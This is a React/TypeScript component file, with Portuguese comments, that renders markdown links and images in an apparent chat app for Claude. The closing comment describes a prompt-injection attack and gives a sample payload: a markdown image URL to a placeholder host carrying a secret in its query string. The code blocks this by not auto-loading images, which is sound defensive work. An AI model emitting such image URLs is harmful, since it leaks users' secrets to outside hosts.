import { createContext, useContext, type MouseEvent, type ReactNode } from 'react'
import { FileLinkContext, parseFileLink } from './fileLinks'
import { scrollWithin } from './scrollWithin'

const LINK = 'text-running underline underline-offset-2'

// Dentro de um link: a imagem dele ([![ci](img)](url)) não vira outro link (<a> dentro de <a>).
const InsideLink = createContext(false)

// "#..." (nota de rodapé e a volta dela) leva ao ponto na própria mensagem. As notas de cada
// resposta têm os mesmos ids, então procura primeiro no markdown em volta.
function goToAnchor(e: MouseEvent<HTMLAnchorElement>, href: string): void {
  e.preventDefault()
  let id = href.slice(1)
  try {
    id = decodeURIComponent(id)
  } catch {
    // Âncora com % solto: vale como está.
  }
  if (!id) return
  const selector = `#${CSS.escape(id)}`
  const target = e.currentTarget.closest('[data-markdown]')?.querySelector(selector) ?? document.querySelector(selector)
  if (target) scrollWithin(target, 'center')
}

// Link de arquivo abre no visualizador de código do app; link da web e de e-mail, fora (o processo
// principal desvia os de target _blank para o navegador e o app de e-mail); âncora rola até o ponto
// na própria conversa. Arquivo sem onde abrir (janela separada) fica como texto.
export function MarkdownLink({ href = '', id, children }: { href?: string; id?: string; children?: ReactNode }) {
  return (
    <InsideLink.Provider value={true}>
      <LinkView href={href} id={id}>
        {children}
      </LinkView>
    </InsideLink.Provider>
  )
}

function LinkView({ href, id, children }: { href: string; id?: string; children?: ReactNode }) {
  const openFile = useContext(FileLinkContext)
  if (href.startsWith('#')) {
    return (
      <a id={id} href={href} onClick={(e) => goToAnchor(e, href)} className={LINK}>
        {children}
      </a>
    )
  }
  const file = parseFileLink(href)
  if (!file) {
    return (
      <a id={id} href={href} target="_blank" rel="noreferrer" className={LINK}>
        {children}
      </a>
    )
  }
  if (!openFile) {
    return (
      <span id={id} title={href}>
        {children}
      </span>
    )
  }
  return (
    <a
      id={id}
      href={href}
      title={href}
      onClick={(e) => {
        e.preventDefault()
        openFile(file.path, file.lines)
      }}
      className={`${LINK} cursor-pointer`}
    >
      {children}
    </a>
  )
}

// Imagem na resposta não carrega sozinha: um texto malicioso lido pelo Claude podia fazer ele
// responder ![](https://site/?d=<segredo>) e o app mandaria o dado para fora sem ninguém clicar.
// Vira um link com o nome da imagem; abrir é escolha da pessoa. Dentro de um link, só o texto: o
// clique vai para o destino do link.
export function MarkdownImage({ src, alt }: { src?: unknown; alt?: string }) {
  const inLink = useContext(InsideLink)
  const href = typeof src === 'string' ? src : ''
  const label = `[imagem: ${alt || href || 'sem endereço'}]`
  return href && !inLink ? <MarkdownLink href={href}>{label}</MarkdownLink> : <span>{label}</span>
}
